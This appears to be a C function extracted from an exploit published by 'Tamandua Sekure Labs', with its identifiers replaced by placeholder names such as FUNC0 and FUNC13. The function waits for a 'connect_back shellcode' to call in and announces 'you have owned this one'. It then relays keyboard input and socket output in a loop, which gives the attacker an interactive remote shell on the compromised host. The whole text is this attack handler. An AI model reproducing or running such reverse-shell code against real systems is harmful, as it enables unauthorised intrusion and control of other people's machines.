#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  u8 ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_addr; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  fd_set ;

/* Variables and functions */
 scalar_t__ FUNC0 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int FUNC3 (int,struct sockaddr*,int*) ; 
 int FUNC4 (int,int) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ) ; 
 char* FUNC7 (int /*<<< orphan*/ ) ; 
 int FUNC8 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (char*,...) ; 
 int FUNC10 (int,int /*<<< orphan*/ *,int) ; 
 scalar_t__ FUNC11 (int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int FUNC12 (int,int /*<<< orphan*/ *,int) ; 

FUNC13(int sock)
{
   fd_set fds;
   u8     tmp[256];
   int    tcp, addr_len;
   struct sockaddr_in server;

   FUNC9(".  waiting for connect_back shellcode responde...  ");
   if (FUNC4(sock, 15)!=sock)
	{
  	FUNC9("\bfailed!\r*\n");
        FUNC6(0);
        }
    tcp = FUNC3( sock, (struct sockaddr *)&server, &addr_len);
    FUNC9("\bconnected\n.       ^---> from %s:%d\n", FUNC7(server.sin_addr), FUNC8(server.sin_port));
    FUNC5(sock); /* closing incoming socket */
    FUNC9(".  congratulations. you have owned this one.\n");

    
    /* basic async mode */
    while (1)
        {
        FUNC2(&fds);
        FUNC1(0, &fds);
        FUNC1(tcp, &fds);
       
        if (FUNC11(tcp+1, &fds, NULL, NULL, NULL)>0)
           {
           if (FUNC0(0, &fds))
              {
              int n;
              n = FUNC10(0, tmp, 256);
              if (n<0)
                 goto end_conn;
              if (FUNC12(tcp, tmp, n)!=n) goto end_conn;
              }
           if (FUNC0(tcp, &fds))
              {
              int n;
              n = FUNC10(tcp, tmp, 256);
              if (n<0)
                 goto end_conn;

              if (FUNC12(0, tmp, n)!=n) goto end_conn;
              }
	   }
	}
end_conn:
    FUNC5(tcp);
    FUNC9(".  bye-bye. Stay tuned for more Tamandua Sekure Labs codes.\n");  
}